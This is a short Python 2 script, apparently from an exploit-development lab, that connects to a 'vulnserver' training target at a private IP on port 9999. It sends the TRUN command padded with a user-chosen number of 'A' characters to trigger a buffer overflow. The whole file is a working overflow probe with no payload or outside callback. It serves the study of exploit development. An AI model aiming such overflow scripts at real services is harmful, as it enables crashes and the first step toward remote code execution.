#!/usr/bin/python2
import socket

server = '192.168.1.138'  # Windows 7 vulnserver IP
sport = 9999

length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, sport))

print s.recv(1024)
print "Sending attack length", length, "to TRUN ."

attack = 'A' * length
s.send('TRUN .' + attack + '\r\n')

print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)

s.close()

